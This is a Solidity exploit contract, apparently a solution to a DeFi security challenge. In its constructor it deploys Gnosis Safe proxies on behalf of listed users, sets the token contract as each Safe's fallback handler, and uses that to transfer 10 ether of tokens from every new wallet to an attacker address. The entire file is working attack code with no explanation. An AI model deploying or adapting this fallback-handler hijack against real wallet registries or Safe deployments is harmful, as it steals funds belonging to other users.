// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract FakeWallet {
    constructor(
        address tokenAddr,
        address factoryAddr,
        address masterCopyAddr,
        address registerAddr,
        address[] memory userAddrs,
        address attackerAddr
    ) {
        GnosisSafeProxyFactory factory = GnosisSafeProxyFactory(factoryAddr);

        for (uint256 i = 0; i < userAddrs.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = userAddrs[i];
            bytes memory initData = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners, // owners
                1, // _threshold
                address(0), // to for setupModules
                "", // data for setupModules
                tokenAddr, // fallbackHandler
                address(0), // paymentToken
                0, // payment
                address(0) // paymentReceiver
            );
            GnosisSafeProxy wallet = factory.createProxyWithCallback(masterCopyAddr, initData, i, IProxyCreationCallback(registerAddr));
            IERC20(address(wallet)).transfer(attackerAddr, 10 ether);
        }
    }
}
